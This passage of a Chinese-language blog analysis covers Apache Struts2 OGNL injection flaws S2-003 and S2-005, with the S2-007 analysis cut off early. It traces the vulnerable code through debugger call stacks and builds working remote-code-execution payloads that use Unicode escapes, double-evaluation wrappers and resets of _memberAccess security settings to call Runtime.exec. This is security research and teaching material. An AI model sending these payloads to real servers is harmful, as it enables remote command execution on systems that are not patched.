class="hljs-symbol">setValueBody:</span><span class="hljs-number">168</span>, ASTChain (ognl)<br><span class="hljs-symbol">evaluateSetValueBody:</span><span class="hljs-number">177</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">246</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValueBody:</span><span class="hljs-number">75</span>, ASTEval (ognl)<br><span class="hljs-symbol">evaluateSetValueBody:</span><span class="hljs-number">177</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">246</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">476</span>, Ognl (ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">186</span>, OgnlUtil (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">158</span>, OgnlValueStack (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">146</span>, OgnlValueStack (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">setParameters:</span><span class="hljs-number">187</span>, ParametersInterceptor (<span class="hljs-keyword">com</span>.opensymphony.xwork2.interceptor)<br><span class="hljs-symbol">intercept:</span><span class="hljs-number">153</span>, ParametersInterceptor (<span class="hljs-keyword">com</span>.opensymphony.xwork2.interceptor)<br></code></pre></td></tr></table></figure>

<p>这主要是因为 在 ParametersInterceptor#intercept 函数中，设置了 DenyMethodExecution 为 true</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408144609472.png" srcset="/img/loading.gif" lazyload alt="image-20250408144609472"></p>
<h3 id="unicode-符号绕过"><a href="#unicode-符号绕过" class="headerlink" title="unicode 符号绕过"></a>unicode 符号绕过</h3><p>我们得用 ognl 表达式，把 <code>xwork.MethodAccessor.denyMethodExecution</code> 这个的值改为 false</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">(#context[<span class="hljs-string">&#x27;xwork2.ognl.OgnlRuntime.denyMethodExecution&#x27;</span>]=false)(<span class="hljs-string">&#x27;aaa&#x27;</span>)<br>url编码后<br>(%23context%5b%27xwork2.ognl.OgnlRuntime.denyMethodExecution%27%5d%3dfalse)(%27aaa%27)<br></code></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408144856456.png" srcset="/img/loading.gif" lazyload alt="image-20250408144856456"></p>
<p>看一下这个实现</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">protected <span class="hljs-type">boolean</span> acceptableName(String <span class="hljs-type">name</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-type">name</span>.indexOf(<span class="hljs-number">61</span>) == <span class="hljs-number">-1</span> &amp;&amp; <span class="hljs-type">name</span>.indexOf(<span class="hljs-number">44</span>) == <span class="hljs-number">-1</span> &amp;&amp; <span class="hljs-type">name</span>.indexOf(<span class="hljs-number">35</span>) == <span class="hljs-number">-1</span> &amp;&amp; <span class="hljs-type">name</span>.indexOf(<span class="hljs-number">58</span>) == <span class="hljs-number">-1</span> &amp;&amp; !this.isExcluded(<span class="hljs-type">name</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>对应的 ascii 码分别为  <code>=</code>、<code>,</code>、<code>#</code> 、<code>:</code></p>
<p>这部分的绕过</p>
<blockquote>
<p>由于在 <code>OgnlParserTokenManager</code> 方法中使用了 <code>ognl.JavaCharStream#readChar()</code> 方法，在读到 <code>\\u</code> 的情况下，会继续读入 4 个字符，并将它们转换为 char，因此 OGNL 表达式实际上支持了 unicode 编码，这就绕过了之前正则或者字符串判断的限制。</p>
</blockquote>
<p>我们传入 unicode 编码的 payload</p>
<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(&#x27;\u0023context[\<span class="hljs-symbol">&#x27;xwork.MethodAccessor.denyMethodExecution</span>\&#x27;]\u003dfalse&#x27;)(<span class="hljs-name">aaa</span>)<br></code></pre></td></tr></table></figure>

<p>当我们传入了表达式时，会去执行 complie</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408165140827.png" srcset="/img/loading.gif" lazyload alt="image-20250408165140827"></p>
<p>可以去看一下他的处理</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408165321300.png" srcset="/img/loading.gif" lazyload alt="image-20250408165321300"></p>
<p>调用 topLevelExpression</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408165356848.png" srcset="/img/loading.gif" lazyload alt="image-20250408165356848"></p>
<p>内部有处理 unicode 编码的逻辑，其主要逻辑在 JavaCharStream 中，在 OgnlParser 的构造函数中，就初始化了 JavaCharStream</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408170429804.png" srcset="/img/loading.gif" lazyload alt="image-20250408170429804"></p>
<p>我们在 javaCharStream 的 readChar 函数下断点</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408170523773.png" srcset="/img/loading.gif" lazyload alt="image-20250408170523773"></p>
<p>在 294 行看到处理 unicode 编码的逻辑</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408170902764.png" srcset="/img/loading.gif" lazyload alt="image-20250408170902764"></p>
<p>经过 complie 解析后 return o 的值</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408174638058.png" srcset="/img/loading.gif" lazyload alt="image-20250408174638058"></p>
<p>之后到 ASTEval 的 setValueBody</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408175307016.png" srcset="/img/loading.gif" lazyload alt="image-20250408175307016"></p>
<h3 id="双层-ASTEval-绕过"><a href="#双层-ASTEval-绕过" class="headerlink" title="双层 ASTEval 绕过"></a>双层 ASTEval 绕过</h3><blockquote>
<p><code>ASTAssign</code> (代表赋值操作，如 <code>user.name = &#39;New Value&#39;</code>)</p>
</blockquote>
<p>但是我们就两个 <code>(one)(two)</code> 的时候，会抛出异常</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408175608060.png" srcset="/img/loading.gif" lazyload alt="image-20250408175608060"></p>
<p>这是因为 我们 在 ASTEval 的 setValueBody 中，children [0] 和 children [1] 获取完了之后，调用了 ASTAssign 的 setValue 方法，而 ASTAssign 本身就没有 setValue 方法，他只实现了 getValueBody 方法，也就是说 ASTAssign 这个节点是不允许有 setValue 操作的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ognl;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ASTAssign</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SimpleNode</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ASTAssign</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> &#123;<br>        <span class="hljs-built_in">super</span>(id);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ASTAssign</span><span class="hljs-params">(OgnlParser p, <span class="hljs-type">int</span> id)</span> &#123;<br>        <span class="hljs-built_in">super</span>(p, id);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">getValueBody</span><span class="hljs-params">(OgnlContext context, Object source)</span> <span class="hljs-keyword">throws</span> OgnlException &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.children[<span class="hljs-number">1</span>].getValue(context, source);<br>        <span class="hljs-built_in">super</span>.children[<span class="hljs-number">0</span>].setValue(context, source, result);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.children[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot; = &quot;</span> + <span class="hljs-built_in">super</span>.children[<span class="hljs-number">1</span>];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>这本身也是见名知意的事情，ASTAssign 的语义是“执行赋值”，而不是“被赋值”。</p>
<p>通过 getValueBody 执行赋值：</p>
<ol>
<li><p>求值右边（children [1]），得到一个值。</p>
</li>
<li><p>将这个值设置到左边（children [0]）上。</p>
</li>
<li><p>返回右边的值作为整个表达式的结果。</p>
</li>
</ol>
</blockquote>
<p>那我们要怎么去让他执行到 getValueBody 呢？</p>
<p>答案也很简单，我们让 ASTEval 的 children [0] 作为一个新的 ASTEval，这时候 children [0].getValueBody() 方法就会去执行 ASTEval 的 getValueBody 方法，进而可以执行到 ASTAssign 的 getValueBody 方法</p>
<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(&#x27;\u0023context[\<span class="hljs-symbol">&#x27;xwork.MethodAccessor.denyMethodExecution</span>\&#x27;]\u003dfalse&#x27;)(<span class="hljs-name">aaa</span>)(<span class="hljs-name">aaa</span>)<br></code></pre></td></tr></table></figure>

<p>看到 在 ASTEval 的 setValueBody 中 children [0] 作为了一个新的 ASTEval 对象，并且可以执行 getValue 方法</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408184404932.png" srcset="/img/loading.gif" lazyload alt="image-20250408184404932"></p>
<p>跟一下</p>
<p>ognl.SimpleNode#getValue &#x3D;&gt; ognl.SimpleNode#evaluateGetValueBody &#x3D;&gt; ASTEval#getValueBody</p>
<p>可以看到最终到了 ASTAssign 的 getValue 方法 </p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408184932123.png" srcset="/img/loading.gif" lazyload alt="image-20250408184932123"></p>
<p>ASTAssign 也没有实现 getValue 方法，经过父类的中转，最终来到了它的 getValueBody 方法</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408182016464.png" srcset="/img/loading.gif" lazyload alt="image-20250408182016464"></p>
<p>再往下走一步</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408182045669.png" srcset="/img/loading.gif" lazyload alt="image-20250408182045669"></p>
<h3 id="最终-payload"><a href="#最终-payload" class="headerlink" title="最终 payload"></a>最终 payload</h3><p>经过上面的分析，我们的 payload 来到了</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003dfalse&#x27;)(<span class="hljs-name">aaa</span>)(<span class="hljs-name">aaa</span>)&amp;(&#x27;@java.lang.Runtime@getRuntime().exec(\&#x27;calc\&#x27;)&#x27;)(&#x27;aaa&#x27;)<br></code></pre></td></tr></table></figure>

<p>我们打进去看看</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408190227623.png" srcset="/img/loading.gif" lazyload alt="image-20250408190227623"></p>
<p>由于 TreeMap 的特性，我们会先去解析静态变量 <code>@</code> 我们得在 Runtime 之前给他加个赋值语句, 加上 <code>=</code> 号 之后，别忘了再次 把 ASTEval 双写，不然还是会 在 ASTAssign 出报错的</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003dfalse&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)&amp;(&#x27;\u0023lingx5\u003d@java.lang.Runtime@getRuntime().exec(\&#x27;calc\&#x27;)&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)<br></code></pre></td></tr></table></figure>

<p>看到先执行 </p>
<blockquote>
<p>(‘\u0023context [&#39;xwork.MethodAccessor.denyMethodExecution&#39;]\u003dfalse’)(lingx5)(lingx5)</p>
</blockquote>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408190714955.png" srcset="/img/loading.gif" lazyload alt="image-20250408190714955"></p>
<p>在执行</p>
<blockquote>
<p>(‘\u0023lingx5\<a href="mailto:&#x75;&#x30;&#x30;&#x33;&#100;&#64;&#x6a;&#97;&#118;&#x61;&#46;&#108;&#97;&#x6e;&#103;&#46;&#x52;&#117;&#x6e;&#116;&#x69;&#109;&#101;">u003d@java.lang.Runtime</a>@getRuntime().exec(&#39;calc&#39;)’)(lingx5)(lingx5)</p>
</blockquote>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408191245437.png" srcset="/img/loading.gif" lazyload alt="image-20250408191245437"></p>
<p>来到了命令执行拦截的地方，可以看到 这次我们的 e 为 false ，就会去调用方法了</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408190948927.png" srcset="/img/loading.gif" lazyload alt="image-20250408190948927"></p>
<p>去掉断点，运行程序，成功执行</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408191548600.png" srcset="/img/loading.gif" lazyload alt="image-20250408191548600"></p>
<h2 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h2><p>官方在 struts2-core 2.0.12 对 S2-003 进行了修复，S2-005 实际上就是 S2-003 的绕过</p>
<p>影响版本：Struts 2.0.0 - Struts 2.1.8.1 </p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-005">https://cwiki.apache.org/confluence/display/WW/S2-005</a></p>
<p>看到 setParameters 方法 新增了一个 ClearableValueStack 和 MemberAccessValueStack 接口，来增加安全性</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250408205604183.png" srcset="/img/loading.gif" lazyload alt="image-20250408205604183"></p>
<p>这两个安全接口由 com.opensymphony.xwork2.util.OgnlValueStack 实现</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409093830901.png" srcset="/img/loading.gif" lazyload alt="image-20250409093830901"></p>
<h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们可以用 S3-003 的 payload 来打一下，看看有哪些限制</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003dfalse&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)&amp;(&#x27;\u0023lingx5\u003d@java.lang.Runtime@getRuntime().exec(\&#x27;calc\&#x27;)&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)<br></code></pre></td></tr></table></figure>

<p>看到在 ParametersInterceptor#setParameters 方法 初始化的 stack，新添了一些安全的参数</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409094931824.png" srcset="/img/loading.gif" lazyload alt="image-20250409094931824"></p>
<p>看到第一个参数执行完成，还是可以成功修改 xwork.MethodAccessor.denyMethodExecution 的值的</p>
<blockquote>
<p>(‘\u0023context [&#39;xwork.MethodAccessor.denyMethodExecution&#39;]\u003dfalse’)(lingx5)(lingx5)</p>
</blockquote>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409095334113.png" srcset="/img/loading.gif" lazyload alt="image-20250409095334113"></p>
<p>这就说明了，我们的 ognl 表达式 还是可以被解析执行的。那么我们的方法并没有执行，肯定是新加入的某个参数判断，阻止了 我们的恶意命令执行，我们只需要把它找出来，用 ognl 表达式修改为对应可以执行的参数即可</p>
<p>我们跟一下这个第二句命令执行的操作，看看是哪里做了限制</p>
<blockquote>
<p>(‘\u0023lingx5\<a href="mailto:&#117;&#48;&#48;&#51;&#100;&#64;&#x6a;&#97;&#118;&#97;&#46;&#x6c;&#x61;&#x6e;&#x67;&#46;&#x52;&#117;&#x6e;&#116;&#105;&#x6d;&#x65;">u003d@java.lang.Runtime</a>@getRuntime().exec(&#39;calc&#39;)’)(lingx5)(lingx5)</p>
</blockquote>
<p>通过调试发现在 SecurityMemberAccess#isAcceptableProperty 的判断，没有通过</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409102424409.png" srcset="/img/loading.gif" lazyload alt="image-20250409102424409"></p>
<p>程序的调用站，拿出来看一下</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">isAcceptableProperty:</span><span class="hljs-number">71</span>, SecurityMemberAccess (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">isAccessible:</span><span class="hljs-number">67</span>, SecurityMemberAccess (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">isMethodAccessible:</span><span class="hljs-number">1283</span>, OgnlRuntime (ognl)<br><span class="hljs-symbol">callAppropriateMethod:</span><span class="hljs-number">796</span>, OgnlRuntime (ognl)<br><span class="hljs-symbol">callStaticMethod:</span><span class="hljs-number">48</span>, ObjectMethodAccessor (ognl)<br><span class="hljs-symbol">callStaticMethod:</span><span class="hljs-number">99</span>, XWorkMethodAccessor (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">callStaticMethod:</span><span class="hljs-number">833</span>, OgnlRuntime (ognl)<br><span class="hljs-symbol">getValueBody:</span><span class="hljs-number">65</span>, ASTStaticMethod (ognl)<br><span class="hljs-symbol">evaluateGetValueBody:</span><span class="hljs-number">170</span>, SimpleNode (ognl)<br><span class="hljs-symbol">getValue:</span><span class="hljs-number">210</span>, SimpleNode (ognl)<br><span class="hljs-symbol">getValueBody:</span><span class="hljs-number">109</span>, ASTChain (ognl)<br><span class="hljs-symbol">evaluateGetValueBody:</span><span class="hljs-number">170</span>, SimpleNode (ognl)<br><span class="hljs-symbol">getValue:</span><span class="hljs-number">210</span>, SimpleNode (ognl)<br><span class="hljs-symbol">getValueBody:</span><span class="hljs-number">49</span>, ASTAssign (ognl)<br><span class="hljs-symbol">evaluateGetValueBody:</span><span class="hljs-number">170</span>, SimpleNode (ognl)<br><span class="hljs-symbol">getValue:</span><span class="hljs-number">210</span>, SimpleNode (ognl)<br><span class="hljs-symbol">getValueBody:</span><span class="hljs-number">58</span>, ASTEval (ognl)<br><span class="hljs-symbol">evaluateGetValueBody:</span><span class="hljs-number">170</span>, SimpleNode (ognl)<br><span class="hljs-symbol">getValue:</span><span class="hljs-number">210</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValueBody:</span><span class="hljs-number">67</span>, ASTEval (ognl)<br><span class="hljs-symbol">evaluateSetValueBody:</span><span class="hljs-number">177</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">246</span>, SimpleNode (ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">476</span>, Ognl (ognl)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">186</span>, OgnlUtil (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">178</span>, OgnlValueStack (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">setValue:</span><span class="hljs-number">166</span>, OgnlValueStack (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">setParameters:</span><span class="hljs-number">230</span>, ParametersInterceptor (<span class="hljs-keyword">com</span>.opensymphony.xwork2.interceptor)<br><span class="hljs-symbol">doIntercept:</span><span class="hljs-number">176</span>, ParametersInterceptor (<span class="hljs-keyword">com</span>.opensymphony.xwork2.interceptor)<br></code></pre></td></tr></table></figure>

<p>我们来看一下 isAcceptableProperty 这个方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAcceptableProperty</span><span class="hljs-params">(String name)</span> &#123;<br>    <span class="hljs-keyword">if</span> (isAccepted(name) &amp;&amp; !isExcluded(name)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-comment">//  isAccepted 方法的判断逻辑</span><br><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAccepted</span><span class="hljs-params">(String paramName)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.acceptProperties.isEmpty()) &#123;<br>        <span class="hljs-keyword">for</span> (Pattern pattern : acceptProperties) &#123;<br>            <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> pattern.matcher(paramName);<br>            <span class="hljs-keyword">if</span> (matcher.matches()) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//no match, but acceptedParams is not empty</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//empty acceptedParams</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">// isExcluded 方法的判断逻辑</span><br><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isExcluded</span><span class="hljs-params">(String paramName)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.excludeProperties.isEmpty()) &#123;<br>        <span class="hljs-keyword">for</span> (Pattern pattern : excludeProperties) &#123;<br>            <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> pattern.matcher(paramName);<br>            <span class="hljs-keyword">if</span> (matcher.matches()) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>以上逻辑不难发现只有当 <code>isAccepted()</code> 返回 true，<code>isExcluded()</code> 返回 false 的情况下，才能调用方法</p>
<p>我们接着往下调试，看到 <code>isAccepted()</code> 返回 true</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409103041065.png" srcset="/img/loading.gif" lazyload alt="image-20250409103041065"></p>
<p>而在 isExcluded() 方法中，因为 paramName 为空 抛出了异常，所以就没有放回 false</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409103130411.png" srcset="/img/loading.gif" lazyload alt="image-20250409103130411"></p>
<p>所以我们只需要用 ognl 表达式把 excludeProperties  设置为空，就可以绕过这个异常抛出，从而返回 false</p>
<p>我们看看 excludeProperties 在哪里？怎么设置</p>
<p>在刚开始创建的 newStack 中</p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250409104635205.png" srcset="/img/loading.gif" lazyload alt="image-20250409104635205" style="zoom:67%;" />

<p>我们跟一下 newStack 的创建过程 发现调用了 ognl.Ognl#createDefaultContext 方法 来创建 context 上下文</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409105234009.png" srcset="/img/loading.gif" lazyload alt="image-20250409105234009"></p>
<p>封转完成 是 给到了 OgnlContext 的 memberAccess 属性，看到它继承了 Map</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409123017789.png" srcset="/img/loading.gif" lazyload alt="image-20250409123017789"></p>
<p>那么我们的程序是如何来获取的呢？</p>
<p>最终在 OgnlContext 的 get 方法中找到了对应的键 <code>_memberAccess</code> 会返回 memberAccess</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409122809009.png" srcset="/img/loading.gif" lazyload alt="image-20250409122809009"></p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>所以就构造出来可以绕过的 payload</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003dfalse&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)&amp;(&#x27;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)&amp;(&#x27;\u0023lingx5\u003d@java.lang.Runtime@getRuntime().exec(\&#x27;calc\&#x27;)&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)<br></code></pre></td></tr></table></figure>

<p>看到当我们用 Runtime 执行方法时，excludeProperties 为空，成功绕过</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409125047313.png" srcset="/img/loading.gif" lazyload alt="image-20250409125047313"></p>
<p>执行成功</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409125127030.png" srcset="/img/loading.gif" lazyload alt="image-20250409125127030"></p>
<p>当然为了 payload 的通用性，我们还可以一并把 acceptProperties 设为空集，allowStaticMethodAccess 设置为 true</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003dfalse&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)&amp;(&#x27;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)&amp;(&#x27;\u0023_memberAccess.acceptProperties\u003d@java.util.Collections@EMPTY_SET&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)&amp;(&#x27;\u0023_memberAccess.allowStaticMethodAccess \u003dtrue&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)&amp;(&#x27;\u0023lingx5\u003d@java.lang.Runtime@getRuntime().exec(\&#x27;calc\&#x27;)&#x27;)(<span class="hljs-name">lingx5</span>)(<span class="hljs-name">lingx5</span>)<br></code></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409125605744.png" srcset="/img/loading.gif" lazyload alt="image-20250409125605744"></p>
<h2 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h2><p>影响版本：Struts 2.0.0 - Struts 2.2.3 </p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-007">https://cwiki.apache.org/confluence/display/WW/S2-007 </a> </p>
<p>在我们向表单中输入数据时，比如 <code>int age</code> 我们给它输入一个 <code>aaa</code> 的字符串。这时他转换不成 int 类型，struts2 就会调用 com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor 拦截器来处理这个错误，并且将用户输入取出插入到当前值栈中，二次解析我们的输入，从而造成了表达式注入</p>
<h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们向 为 int 类型的 age 字段 输入 <code>aaaa</code></p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250409150608407.png" srcset="/img/loading.gif" lazyload alt="image-20250409150608407" style="zoom:50%;" />

<p>在 ConversionErrorInterceptor#intercept() 下断点，跟一下看他如何处理的</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409150743359.png" srcset="/img/loading.gif" lazyload alt="image-20250409150743359"></p>
